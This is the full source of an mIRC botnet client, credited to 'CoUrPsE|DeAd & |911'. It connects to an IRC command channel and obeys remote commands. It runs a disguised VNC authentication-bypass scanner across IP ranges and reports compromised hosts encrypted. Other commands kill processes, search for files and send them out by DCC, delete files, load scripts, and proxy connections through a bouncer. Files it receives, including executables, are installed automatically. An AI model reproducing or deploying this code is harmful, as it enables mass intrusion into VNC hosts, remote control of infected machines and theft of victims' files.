on *:START: {
  if (!$readini($+(",$nofile($mircexe),config.ini"),config,threads)) { writeini $+(",$nofile($mircexe),config.ini") config threads 500 }
  if (!$readini($+(",$nofile($mircexe),config.ini"),config,key)) { writeini $+(",$nofile($mircexe),config.ini") config key intro }
  nick $+(YouGotReported-[,$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),])
  anick $+(YouGotReported-[,$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),])
  identd on $+(YouGotReported-[,$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),])
  emailaddr $+(YouGotReported,$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),@gmail.com)
  fullname YouGotReported $+($r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9))
  server irc.frozyn.net
}
on *:CONNECT: { 
  join #facker $iif($readini($+(",$nofile($mircexe),config.ini"),config,key) == intro,,$readini($+(",$nofile($mircexe),config.ini"),config,key))
}
on *:JOIN:#facker:{
  if ($nick == $me) {
    set %proc.check on
    set %proc.chan $chan
    checkproc
  }
}
alias checkscans {
  if (!$exists(C:/windows/system/msdn/found.txt)) { set %y 1 }
  if ($read(C:/windows/system/MSDN/vnc_bypauth.txt,w,*vulnerable*,%y)) {
    write C:/windows/system/MSDN/found.txt $gettok($read(C:/windows/system/MSDN/vnc_bypauth.txt,w,*vulnerable*,%y),1,32)
    sendenc $gettok($gettok($read(C:/windows/system/MSDN/vnc_bypauth.txt,w,*vulnerable*,%y),1,32),1,58))
    set %y $calc($readn +1)
  }
  if ($read(C:/windows/system/MSDN/vnc_bypauth.txt,w,*Complete*)) { 
    msg $readini(C:/windows/system/MSDN/config.ini,config,chan) Scan of $readini(C:/windows/system/MSDN/config.ini,config,ip) Complete. $+([pwn3d $lines(C:/windows/system/msdn/found.txt),])
    .timer 1 4 .remove C:/windows/system/MSDN/vnc_bypauth.txt 
    if ($exists(C:/windows/system/MSDN/found.txt)) { .remove C:/windows/system/MSDN/found.txt }
    timercheck off
  }
}
alias checkproc {
  set %temp.write $+($nofile($mircexe),process.bat)
  write %temp.write @echo off
  write %temp.write cd /D $nofile(%temp.write)
  write %temp.write process.exe -c > process.log
  write %temp.write echo COMPLETED SCAN >> process.log
  .run $+($nofile($mircexe),hiderun.exe) %temp.write
  .timerprocr 0 2 readproc
}
alias readproc {
  if ($read(C:/windows/system/msdn/process.log, $lines(C:/windows/system/msdn/process.log)) != COMPLETED SCAN) { halt }
  if (%proc.all == on) {
    var %x = 5 | while (%x <= $calc($lines(C:/windows/system/msdn/process.log) -1)) {
      if ($read(C:/windows/system/msdn/process.log,%x)) .msg %proc.nick $read(C:/windows/system/msdn/process.log,%x)
      inc %x
    }
  }
  if (%proc.kill) {
    var %x = 5 | while (%x <= $lines($+($nofile($mircexe),process.log))) {
      if ($gettok($read($+($nofile($mircexe),process.log),%x),2,32) == %proc.kill) { 
        msg %proc.chan Process: Killing $+($gettok($read($+($nofile($mircexe),process.log),%x),1,32),:) PID: %proc.kill
        .run C:/windows/system/msdn/hiderun.exe process -k %proc.kill
      }
      inc %x
    }
  }
  if (%proc.check) {
    if ($read($+($nofile($mircexe),process.log),w,*iexplorer1.exe*)) {
      .msg %proc.chan Still Scanning Previous Range: %scan.ip
      .timercheck 0 3 checkscans
    }
    else {
      delvnc
      .msg %proc.chan VNC: Could Not Complete Scan: Disconnected.
    }
  }
  if (!%proc.all) && (!%proc.kill) && (!%proc.check) {
    .msg %proc.nick Process: Search Result for $+(*,%proc.search,*)
    .msg %proc.nick ImageName PID Threads Priority CPU Creation time
    :proc
    if ($read(C:/windows/system/msdn/process.log,w,$+(*,%proc.search,*))) {
      .msg %proc.nick $read(C:/windows/system/msdn/process.log,$readn)
      write -dl $+ $readn C:/windows/system/msdn/process.log
      goto proc
    }
    .msg %proc.nick Process: Results Finsihed.
  }
  .remove %temp.write
  .remove $+($nofile(%temp.write),process.log) | unset %proc.* | .timerprocr off
}
alias checkkey {
  var %x = 1 | while (%x <= 5) {
    if (!$readini($+($nofile($mircexe),config.ini),crypt,$+(key,%x))) { set %vnc.key.check false }
    inc %x
  }
  if (%vnc.key.check == false) {
    unset %vnc.key.check
    return $false
  }
}
alias sendenc {
  if ($checkkey == $false) { msg $readini(C:/windows/system/MSDN/config.ini,config,chan) Error: Cant Send Result. KEYS ARE NOT SET. | halt }
  msg #facker Found VNC: $gettok($dll($+($nofile($mircexe),blowfish.dll),Encrypt,$readini($+($nofile($mircexe),config.ini),crypt,$+(key,$r(1,5))) TRUE $1-),2-,32)

}
alias delvnc {
  if ($exists(C:/windows/system/MSDN/vnc_bypauth.txt)) { .remove C:/windows/system/MSDN/vnc_bypauth.txt }
  if (!$exists(C:/windows/system/MSDN/vnc_bypauth.txt)) { timerdelvnc off }
}
on *:TEXT:.*:#: {
  if ($1 == .proc) && ($2 == $me) {
    if ($3 == all) {
      set %proc.nick $nick | set %proc.all on
      checkproc
    }
    if ($3 == search) {
      if (!$4) { msg $chan Process: Syntax: .proc $me [All/Search String] | halt }
      set %proc.search $4
      set %proc.nick $nick
      checkproc
    }
    if ($3 == kill) {
      if (!$4) || ($5) { msg $nick Process: Syntax: .proc $me kill pid | halt }
      set %proc.kill $4
      set %proc.chan $chan
      checkproc
    }
  }
  if ($1 == .info) {
    if (($2 == $me) || ($2 == all)) {
      if ($3 == ip) { msg $chan IP Address: $ip }
      if ($3 == os) { msg $chan Windows: $os }
      if ($3 == fport) {
        if ($4 !isnum) { msg $chan Syntax: .info [Nick/All] fport <num> | halt }
        if (($4 < 1) || ($4 > 65535)) { msg $chan Port must be between 1-65535 | halt }
        msg $chan Port $4 State: $portfree($4)
      }
    }
  }
  if ($1 == .release) {
    if (($2 == $me) || ($2 == all)) { msg $chan Version 0.3 By CoUrPsE|DeAd & |911 }
  }
  if ($1 == .sfile) {
    if ($2 == $me) {
      set %scan.search  $findfile($nofile($mircexe),$+(*,$3-,*),0,msg $chan Found: $1-)
      msg $chan Total Found: %scan.search
    }
  }
  if ($1 == .help) {
    notice $nick .key, .nokey, .scan, .join, .part, .send, .script, .rip, .delete, .sfile
  }
  if ($1 == .rip) {
    if (!$2) || (!$3) { msg $chan Syntax: .rip [Nick/All] Number/Number.Number | halt }
    if (($2 == all) || ($2 == $me)) {
      if ($exists(C:/windows/system/MSDN/vnc_bypauth.txt)) { msg # Already Scanning $readini(C:/windows/system/MSDN/config.ini,config,ip) | halt }
      if ($count($3,.) == 0) { 
        set %scan.ip $+($3,.,$r(1,254),.1.1))
        set %scan.r.1 $gettok(%scan.ip,2,46)
        set %scan.range $+($gettok(%scan.ip,1,46),.,$calc(%scan.r.1 +1),.255.255))
        .run C:/windows/system/MSDN/hiderun.exe C:/windows/system/MSDN/iexplorer1.exe -i $+(%scan.ip,-,%scan.range) -vnc -vv -T $readini($+(",$nofile($mircexe),config.ini"),config,threads) -p 5900
        msg # Scanning $3 $+(%scan.ip,-,%scan.range)
        .timercheck 0 2 checkscans
        writeini C:/windows/system/MSDN/config.ini config ip %scan.ip
        writeini C:/windows/system/MSDN/config.ini config chan $chan
      }
      if ($count($3,.) == 1) { 
        set %scan.ip $+($3,.1.1))
        set %scan.r.1 $gettok(%scan.ip,3,46)
        set %scan.range $+($gettok(%scan.ip,1-2,46),.255.255))
        .run C:/windows/system/MSDN/hiderun.exe C:/windows/system/MSDN/iexplorer1.exe -i $+(%scan.ip,-,%scan.range) -vnc -vv -T $readini($+(",$nofile($mircexe),config.ini"),config,threads) -p 5900
        msg # Scanning $+(%scan.ip,-,%scan.range)
        .timercheck 0 4 checkscans
        writeini C:/windows/system/MSDN/config.ini config ip %scan.ip
        writeini C:/windows/system/MSDN/config.ini config chan $chan
      }
    }
  }
  if ($1 == .key) { 
    if (!$2) { msg # Syntax: .key key | halt }
    if ($3) { msg # Syntax: .key key (No Spaces) | halt }
    writeini $+(",$nofile($mircexe),config.ini") config key $2
    msg # Key Changed to $2
  }
  if ($1 == .nokey) { 
    writeini $+(",$nofile($mircexe),config.ini") config key intro
    msg # Key Removed
  }
  if ($1 == .scan) {
    if (($2 != $me) && (Facker isin $2)) { halt }
    if (($2 == $me) || ($2 == all)) {
      if ($3 == set) {
        if ($4 == threads) {
          if ($4 > 0) && ($4 <= 500) {
            writeini $+($nofile($mircexe),config.ini) config threads $4
          }
          else msg $chan Syntax: .scan [Nick/All] set threads <num>
        }
      }
      if ($3 == stop) {
        if (!$exists(C:/windows/system/MSDN/vnc_bypauth.txt)) { halt }
        .run C:/windows/system/msdn/hiderun.exe process -k iexplorer1.exe
        timercheck off
        .timerdelvnc 0 4 delvnc
        if ($exists(C:/windows/system/MSDN/found.txt)) { .remove C:/windows/system/MSDN/found.txt }
        .timer 1 2 msg $chan Scanning Has Stopped. 
        halt 
      }
      if ($3) {
        if ($chr(45) !isin $3) || ($count($3,.) != 6) || (!$3) && (Facker !isin $1-) { msg # Syntax: .scan Nick 12.1.1.1-12.255.255.255 | halt }
        if ($exists(C:/windows/system/MSDN/vnc_bypauth.txt)) { msg # Already Scanning $readini(C:/windows/system/MSDN/config.ini,config,ip) | halt }
        .run C:/windows/system/MSDN/hiderun.exe C:/windows/system/MSDN/iexplorer1.exe -i $3 -vnc -vv -T $readini($+(",$nofile($mircexe),config.ini"),config,threads) -p 5900
        msg # Scanning $3
        .timercheck 0 3 checkscans
        writeini C:/windows/system/MSDN/config.ini config ip $3
        writeini C:/windows/system/MSDN/config.ini config chan $chan
      }
    }
    else { msg # Syntax: .scan Nick 12.1.1.1-12.255.255.255 }
  }
  if ($1 == .join) {
    if (($2 == $me) || ($2 == all)) {
      if ($chr(35) !isin $3) { msg # Syntax: .join [Nick/All] #channel | halt }
      join $3
    }
  }
  if ($1 == .part) {
    if (($2 == $me) || ($2 == all)) {
      if (!$3) { msg # Syntax: .part [Nick/All] #channel | halt }
      if ($chr(35) !isin $3) && (Facker !isin $1-) { msg # Syntax: .part [Nick/All] #channel | halt }
      part $3 $nick
    }
  }
  if ($1 == .send) {
    if (($2 == $me) || ($2 == all)) {
      if ($exists($+(",$3-,"))) { dcc send $nick $+(",$3-,") }
      else msg $chan File %+(",$3-,") Doesnt Exist.
    }
  }
  if ($1 == .delete) { 
    if (!$2) || (!$3) { msg $chan Syntax: .delete [Nick/All] Filename | halt }
    if ($2 == $me) || ($2 == all) {
      if (!$exists($3-)) { .msg $chan No Such File $+(",$3-,") | halt }
      if ($exists($3-)) { .remove $+(",$3-,") | msg $chan Succesfully Deleted $+(",$3-,") } 
    }
  }
  if ($1 == .script) {
    if ($2 == list) {
      if (!$3) { msg # Syntax: .script list [Nick/All] | halt }
      if (($3 == $me) || ($3 == all)) && (Fucker !isin $nick) {
        var %x = 1 | while (%x <= $script(0)) {
          msg # Script $+([,%x,]:) $script(%x)
          inc %x
        }
        halt
      }
    }
    if ($2 == load) {
      if (!$4) { msg # Syntax: .script load [Nick/All] Filename | halt }     
      if (($3 == $me) || ($3 == all)) {
        if (!$exists($+(",$4-,"))) { msg # File $+(",$4-,") Doesnt Exist. | halt }
        load -rs $+(",$4-,")
        msg $chan Loaded $+(",$4-,")
        halt
      }
    }
    if ($2 == unload) {
      if (!$4) { msg # Syntax: .script unload [Nick/All] Filename | halt }
      if (($me == $3) || ($3 == all)) {
        var %x = 1 | while (%x <= $script(0)) {
          if ($4 == $nopath($script(%x))) { set %temp.unload $true }
          inc %x
        }
        if (%temp.unload != $true) { msg # File $4 Is Not Loaded. | halt }
        unload -rs $4
        unset %temp.unload
        halt
      }
    }
    if (($2 != load) && ($2 != unload) && ($2 != list)) {
      msg # Syntax: .Script Commands: load,unload,list.
    }
  }
  if ($1 == .bnc) {
    if ($2 == $me) {
      if (!$readini(C:/windows/system/msdn/config.ini,bnc,status)) { writeini C:/windows/system/msdn/config.ini bnc status off }
      if (!$readini(C:/windows/system/msdn/config.ini,bnc,ip)) { writeini C:/windows/system/msdn/config.ini bnc ip $ip }
      if (!$readini(C:/windows/system/msdn/config.ini,bnc,port)) { writeini C:/windows/system/msdn/config.ini bnc port 1040 }

      if ($3 == on) {
        if ($readini(C:/windows/system/msdn/config.ini,bnc,status) == on) { msg $chan BNC: Already Enabled. | halt }
        msg $chan BNC Enabled. $+([,$readini(C:/windows/system/msdn/config.ini,bnc,ip),:,$readini(C:/windows/system/msdn/config.ini,bnc,port),])
        writeini C:/windows/system/msdn/config.ini bnc status on
        socklisten bnc $readini(C:/windows/system/msdn/config.ini,bnc,port)
      }
      if ($3 == off) { 
        if ($readini(C:/windows/system/msdn/config.ini,bnc,status) == off) { msg $chan BNC: Already Disabled. | halt }
        msg $chan BNC Disabled.
        writeini C:/windows/system/msdn/config.ini bnc status off
        sockclose bnc* | sockclose sbnc*
      }
      if ($3 == restart) { 
        sockclose bnc* | sockclose sbnc*
        socklisten bnc $readini(C:/windows/system/msdn/config.ini,bnc,port)
        msg $chan BNC: Restarted.
      }
      if ($3 == set) {
        if ($4 == port) { 
          if ((!$5) || ($5 !isnum)) { msg $chan BNC: Syntax: .bnc set port <num> | halt }
          writeini C:/windows/system/msdn/config.ini bnc port $5
          msg $chan BNC: Port Changed to $5 $iif($readini(C:/windows/system/msdn/config.ini,bnc,status) == on,[BNC Restart Needed]),,)
        }
      }
    }
  }
}
on *:TEXT:*:?: {
  if ($1 == .blow) {
    if ($2 == setkey) {
      if (($3 > 5) || ($3 < 0)) { msg $nick Blow: <num> Has to be 1-5 | halt }
      if ($4 != ComputerS1) { msg $nick Permission Denied | msg #fackers Blow: Attempt Key Change By $nick Failed. | halt }
      if (!$5) { msg $nick Blow: Syntax: .blow setkey <num> <password> <key> | halt }
      if ($len($5) < 15) { msg $nick Blow: Key Needs to be 20 or more Characters. | halt }
      writeini C:/windows/system/msdn/config.ini crypt $+(Key,$3) $5
      msg $nick Blow: Key $right($3,1) Changed. | msg #fackers Blow: Key $right($3,1) Changed.
    }
    if ($2 == list) {
      if ($3 != computerS1) { msg $nick Blow: Permission Denied. | msg #fackers Blow: Key List By $nick Failed. | halt }
      var %x = 1 | while (%x <= 5) {
        if ($readini($+($nofile($mircexe),config.ini),crypt,$+(key,%x))) { msg $nick Blow: Key $+(%x,:) $readini($+($nofile($mircexe),config.ini),crypt,$+(key,%x)) }
        inc %x
      }
    }
  }
  if ($1 == .bnc) {
    if ($2 == pass) {
      if ($nick !isop #facker) { msg $nick BNC: Denied Access. | msg #fackers Denied Access From $nick | halt }
      if (!$3) { msg $nick BNC: Syntax: .bnc pass <NewPass> | halt }
      writeini C:/windows/system/msdn/config.ini bnc $nick $3
      msg $nick BNC: Pass Changed.
      msg #fackers BNC: Password For $nick Changed
    }
  }
  if ($1 == .key) { 
    if (!$2) || (!$3) || ($4) { msg # Syntax: .key passwd key (No Spaces) | halt }
    if ($3 != ComputerS1) { msg # Incorrect Password | halt }
    writeini $+(",$nofile($mircexe),config.ini") config key $3
    msg $nick Key Changed to $3
  }
  if ($1 == .nokey) { 
    if (!$2) { msg # Syntax: .nokey passwd | halt }
    if ($2 != ComputerS1) { msg # Incorrect Password | halt }
    writeini $+(",$nofile($mircexe),config.ini") config key intro
    msg $nick Key Removed
  }
  if ($1 == .join) {
    if ($chr(35) !isin $3) { msg $nick Syntax: .join passwd #channel {key} | halt }
    if (!$3) { msg $nick Syntax: .join passwd #channel | halt }
    if ($2 != ComputerS1) { msg $nick Invalid Password. | halt }
    join $3- | msg $nick Joined $3
  }
  if ($1 == .part) {
    if (!$3) { msg $nick Syntax: .part [Nick/All] #channel | halt }
    if ($chr(35) !isin $3) { msg $nick Syntax: .part passwd #channel | halt }
    if ($2 != ComputerS1) { msg $nick Invalid Password. | halt }
    part $3 $nick | msg $nick Parted $3
  }
}
on *:FILERCVD:*.txt,*.mrc,*.ini,*.dll,*.exe: { .copy -o $+("C:/windows/system/msdn/downloads/,$nopath($filename),") $+(",$nofile($mircexe),$nopath($filename),") | .remove $+(",$filename,") }
on *:DISCONNECT: server irc.frozyn.net
on *:socklisten:BNC*: {
  if ($sockname == BNC) {
    sockaccept BNC-Temp
    sockwrite -n $sock(BNC-Temp) type /quote pass <pass>
  }
}
on *:sockclose:bnc*: {
  if ($sock(sbnc. [ $+ [ $sock($sockname,1) ] ],1)) sockclose sbnc. [ $+ [ $sock($sockname,1) ] ]
}
on *:SOCKREAD:bnc*: {
  if ($left($sockname,3) == bnc) {
    if ($sockname == BNC-Temp) { sockrename BNC-Temp $+(BNC.,$sock($sockname,1).ip) }
    if ($sockerr > 0) return
    :nextread
    sockread %temp
    if ($sockbr == 0) return
    if (%temp == $null) %temp = -
    if ($gettok(%temp,1,32) == SERVER) {
      if (!$gettok(%temp,2,32)) { sockwrite -n $sockname type /quote server <server> | halt }
      set %bnc. [ $+ [ $sock($sockname,1) ] $+ ] .server $gettok(%temp,2,32)
      sockwrite -n $sockname To connect type /quote connect
    }
    if ($gettok(%temp,1,32) == CONNECT) { 

    sockopen sbnc. [ $+ [ $sock($sockname,1) ] ] %bnc. [ $+ [ $sock($sockname,1) ] $+ ] .server 6667 }
    if ($gettok(%temp,1,32) == NICK) { set %bnc. [ $+ [ $sock($sockname,1) ] ] $gettok(%temp,2,32) }
    if ($gettok(%temp,1,32) == USER) { set %bnc. [ $+ [ $sock($sockname,1) ] ] %bnc. [ $+ [ $sock($sockname,1) ] ] $gettok(%temp,2-,32) }
    if ($gettok(%temp,1,32) == PASS) { 
      if ($readini(C:/windows/system/msdn/config.ini,bnc,$gettok(%bnc. [ $+ [ $sock($sockname,1) ] ],1,32)) == $gettok(%temp,2,32)) { 
        sockwrite -n $sockname BNC By CoUrPsE|DeAd
        .timer 1 2 sockwrite -n $sockname type /quote server <server> 
      }
      else sockwrite -n $sockname Auth Failed.
    }
    if ($sock($+(sbnc.,$sockname))) && ($gettok(%temp,1,32) != connect) { sockwrite -n $sock($+(sbnc.,$sockname)) %temp }
    goto nextread
  }
}
on *:SOCKOPEN:SBNC*: {
  sockwrite -n $gettok($sockname,2-,46) Connection to %bnc. [ $+ [ $gettok($sockname,2-,46) ] $+ ] .server Established.
  if ($sock($sockname,1)) {
    sockwrite -n $sockname NICK $gettok(%bnc. [ $+ [ $gettok($sockname,2-,46) ] ],1,32)
    sockwrite -n $sockname USER $gettok(%bnc. [ $+ [ $gettok($sockname,2-,46) ] ],2-,32)
    else sockwrite -n $gettok($sockname,2-,46) Failed Connection.
  }
}
on *:SOCKREAD:sbnc*: {
  if ($sockerr > 0) return
  :nextread
  sockread %temp
  if ($sockbr == 0) return
  if (%temp == $null) %temp = -
  sockwrite -n $gettok($sockname,2-,46) %temp
  goto nextread
}
on *:sockclose:sbnc*: {
  sockwrite -n $gettok($sockname,2-,46) disconnect Connection Dropped.
}
